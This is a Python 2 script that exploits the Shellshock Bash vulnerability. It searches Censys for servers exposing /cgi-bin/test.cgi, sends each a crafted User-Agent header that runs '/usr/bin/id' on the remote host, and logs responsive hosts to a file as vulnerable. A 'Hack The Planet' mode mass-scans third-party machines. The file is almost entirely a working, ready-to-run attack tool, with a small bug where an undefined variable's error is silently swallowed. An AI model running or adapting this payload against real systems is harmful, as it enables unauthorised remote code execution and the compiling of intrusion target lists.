# coding=utf-8

from termcolor import cprint
import json
import requests

API_URL = "https://www.censys.io/api/v1"
UID = "GET ON CENSYS.IO "
SECRET = "GET ON CENSYS.IO"

query = {'query':'80.http.get.title:/cgi-bin/test.cgi'}
user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id"}


def banner():
    cprint('''
   ▄████████  ▄█    █▄   ▄█   ▄█           ███      ▄██████▄   ▄██████▄   ▄█
  ███    ███ ███    ███ ███  ███       ▀█████████▄ ███    ███ ███    ███ ███
  ███    █▀  ███    ███ ███▌ ███          ▀███▀▀██ ███    ███ ███    ███ ███
 ▄███▄▄▄     ███    ███ ███▌ ███           ███   ▀ ███    ███ ███    ███ ███
▀▀███▀▀▀     ███    ███ ███▌ ███           ███     ███    ███ ███    ███ ███
  ███    █▄  ███    ███ ███  ███           ███     ███    ███ ███    ███ ███
  ███    ███ ███    ███ ███  ███▌    ▄     ███     ███    ███ ███    ███ ███▌    ▄
  ██████████  ▀██████▀  █▀   █████▄▄██    ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██
                             ▀                                           ▀
   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█               ▄████████    ▄█    █▄     ▄██████▄   ▄████████    ▄█   ▄█▄
  ███    ███   ███    ███     ███    ███ ███       ███              ███    ███   ███    ███   ███    ███ ███    ███   ███ ▄███▀
  ███    █▀    ███    ███     ███    █▀  ███       ███              ███    █▀    ███    ███   ███    ███ ███    █▀    ███▐██▀
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███              ███         ▄███▄▄▄▄███▄▄ ███    ███ ███         ▄█████▀
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███            ▀███████████ ▀▀███▀▀▀▀███▀  ███    ███ ███        ▀▀█████▄
         ███   ███    ███     ███    █▄  ███       ███                     ███   ███    ███   ███    ███ ███    █▄    ███▐██▄
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄         ▄█    ███   ███    ███   ███    ███ ███    ███   ███ ▀███▄
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██       ▄████████▀    ███    █▀     ▀██████▀  ████████▀    ███   ▀█▀
                                         ▀         ▀                                                                  ▀
    ''','red')
    cprint('[+] - Author: Matheus Bernardes','red')
    cprint('[+] - Nick: G4bler','red')
    cprint('[+] - Vulnerability Description','red')
    cprint('''
GNU Bash through 4.3 processes trailing strings after function definitions in
the values of environment variables, which allows remote attackers to execute
arbitrary code via a crafted environment, as demonstrated by vectors involving
the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in
the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other
situations in which setting the environment occurs across a privilege boundary
from Bash execution, aka "ShellShock." NOTE: the original fix for this issue was
incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is
still present after the incorrect fix.
    ''','red')

def menu():
    banner()
    cprint('''
  ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄   ███    █▄
▄██▀▀▀███▀▀▀██▄   ███    ███ ███▀▀▀██▄ ███    ███
███   ███   ███   ███    █▀  ███   ███ ███    ███
███   ███   ███  ▄███▄▄▄     ███   ███ ███    ███
███   ███   ███ ▀▀███▀▀▀     ███   ███ ███    ███
███   ███   ███   ███    █▄  ███   ███ ███    ███
███   ███   ███   ███    ███ ███   ███ ███    ███
 ▀█   ███   █▀    ██████████  ▀█   █▀  ████████▀
    ''','green')
    cprint('[1] - Hack The Planet','green')
    cprint('[2] - Single URL test','green')
    cprint('[0] - Exit','green')
    print
    print
    option = raw_input('[+] - Chose a option[0-2]: ')
    if option == '1':
        search(API_URL,UID,SECRET,query)
    elif option == '2':
        single()
    elif option == '0':
        exit()
    else:
        print 'please input a valid option'
        menu()

def single():
    url = raw_input('Input the URL to test: ')
    test_conn(url)

def search(API_URL,UID,SECRET,query):
    res = requests.post(API_URL + "/search/ipv4", auth=(UID, SECRET), json=query)
    res_json = res.json()
    if res.status_code == 200:
        build_url(res_json)

def build_url(res_json):
    for info in res_json['results']:
        full_url = 'http://'+info['ip']+'/cgi-bin/test.cgi'
        test_conn(full_url)

def test_conn(url):
        cprint('[+] - Testing connection '+url,'blue')
        try:
            shel_shock_conn = requests.get(url, timeout=5, headers=user_agent ,allow_redirects=True)
            shel_shock_conn_status_code = shel_shock_conn.status_code
            test_vuln(shel_shock_conn_status_code,shel_shock_conn)
        except:
            pass

def test_vuln(status_code,host_connection):
        if status_code != 200:
            cprint("[!] - Something goes wrong",'red')
            print("[!] - Status code: %d") %(status_code)
            print

        else:
            cprint("[+] - Connection success",'green')
            print("[+] - Status Code: %d") %(status_code)

            if host_connection.content.find('uid') != -1:
                cprint("[+] - Host Vuln3r4bl3",'green',attrs=['bold'])
                arq = open('Vuln3r4bl3.txt','a')
                arq.writelines(url+ "\n")
                arq.close

            else:
                cprint("[!] - host not Vulnerable :/",'green','on_red')
            print
menu()
